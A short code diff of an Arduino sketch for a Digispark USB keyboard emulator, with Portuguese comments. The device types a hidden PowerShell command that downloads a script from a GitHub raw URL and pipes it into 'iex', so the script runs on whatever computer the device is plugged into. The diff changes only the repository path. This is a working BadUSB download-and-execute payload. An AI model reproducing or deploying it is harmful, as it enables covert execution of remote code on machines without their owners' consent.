@@ -11,7 +11,7 @@ void setup() {
 
   // 2. Digita o comando PowerShell invisível e executa
   // ATENÇÃO: Mudei o final do link de .sh para .ps1
-  DigiKeyboardPtBr.println("powershell -w hidden -c \"irm https://raw.githubusercontent.com/fabiobrilhante/exemplo/main/mensagem.ps1 | iex\"");
+  DigiKeyboardPtBr.println("powershell -w hidden -c \"irm https://raw.githubusercontent.com/fabiobrilhante/Digispark/main/mensagem.ps1 | iex\"");
 }
 
 void loop() {
